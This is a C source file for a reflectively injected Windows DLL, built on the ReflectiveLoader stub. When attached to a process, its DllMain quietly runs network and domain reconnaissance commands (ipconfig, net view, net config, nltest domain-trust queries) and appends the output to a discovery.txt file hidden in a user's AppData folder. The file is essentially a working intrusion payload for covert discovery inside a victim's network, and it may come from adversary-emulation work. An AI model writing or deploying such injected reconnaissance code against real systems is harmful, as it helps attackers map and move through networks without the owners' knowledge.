//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			WinExec("cmd.exe /c ipconfig /all >> C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\discovery.txt", 0);
			WinExec("cmd.exe /c net config workstation >> C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\discovery.txt", 0);
			WinExec("cmd.exe /c net view /all >> C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\discovery.txt", 0);
			WinExec("cmd.exe /c net view /all /domain >> C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\discovery.txt", 0);
			WinExec("cmd.exe /c nltest /domain_trusts >> C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\discovery.txt", 0);
			WinExec("cmd.exe /c nltest /domain_trusts /all_trusts >> C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\discovery.txt", 0);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}